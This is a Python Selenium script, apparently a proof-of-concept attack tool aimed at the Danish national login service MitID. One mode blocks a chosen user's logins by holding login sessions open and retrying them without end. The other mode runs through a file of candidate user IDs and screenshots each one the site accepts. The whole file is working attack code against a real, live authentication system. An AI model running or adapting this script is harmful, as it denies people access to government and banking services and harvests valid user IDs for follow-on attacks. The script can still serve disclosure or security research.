# MitID-DoS-enum.py - December 2021, Updated January 2022
import csv, sys, time, getopt
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from datetime import datetime

# Initiates a browser instance and fills the login prompt with a username.
def login(driver, username):
    print('click login')   
    login_btn = driver.find_element(webdriver.common.by.By.ID, 'mitid-login-btn')
    login_btn.click()

    # jump to new window and close old
    win_a, win_b = driver.window_handles
    driver.switch_to.window(win_a)
    driver.close()
    driver.switch_to.window(win_b)

    # wait for javascript to populate the DOM
    print('wait for login prompt')
    user_id = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((webdriver.common.by.By.ID, 'username3'))
    )    

    print('fill username')
    actions = webdriver.common.action_chains.ActionChains(driver)
    actions.send_keys(username + webdriver.common.keys.Keys.RETURN)
    actions.perform()
    time.sleep(1)

# Handle different types of errors.
def awaitSpecificFailureText(driver):
    print('Waiting for user login or timeout')
    printTime(driver)
    try:
        error_message = WebDriverWait(driver, timeout=330).until(EC.presence_of_element_located((webdriver.common.by.By.ID, 'mitid-notification-header')))
        print("Error message: " + error_message.text)

        if error_message.text == "Tid udløbet" or "expired" in error_message.text:
            retry_btn = driver.find_element(By.ID,'mitid-retry-button')
            retry_btn.click()
            awaitSpecificFailureText(driver)
        else:
            redoLogin(driver)
    except TimeoutException as e:
        print("A TimeoutException happened")

def redoLogin(driver):
    driver.close()
    driver = webdriver.Firefox()
    driver.get('https://mitid.dk')
    login(driver, sys.argv[2])
    awaitSpecificFailureText(driver)

def printTime(driver):
    now = datetime.now()
    currentTime = now.strftime("%H:%M:%S")
    print("Current Time =", currentTime)

# Deny service to a particular user by keeping sessions alive indefinitely.
def denyService():
    driver = webdriver.Firefox()
    driver.get('https://mitid.dk')
    login(driver, sys.argv[2])
    awaitSpecificFailureText(driver)
    driver.close()

# Enumerates all users in a list of candidate UserIDs read from a text file.
def userEnumerate():
    with open(sys.argv[2], 'r') as file:
        reader = csv.reader(file)
        for row in reader:
            username = row[0]
            if (len(username) > 4):
                print("Trying..." + username)
                opts = webdriver.firefox.options.Options()
                opts.headless = True
                driver = webdriver.Firefox(options=opts)
                driver.get("https://www.mitid.dk")

                login(driver, username)
                html = driver.page_source
                if not("User ID does not exist" in html):
                    driver.save_screenshot('screenshot-' + username + '.png')
                driver.quit()

def main(argv):
    try:
        opts, args = getopt.getopt(argv,"hd:e:")
    except getopt.GetoptError:
        print('Usage: mitid-script.py [-d <username> | -e <file> ]')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('Usage: mitid-script.py [-d <username> | -e <file> ]')
            sys.exit()
        elif opt in ("-d"): denyService() 
        elif opt in ("-e"): userEnumerate()

if __name__ == "__main__":
    main(sys.argv[1:])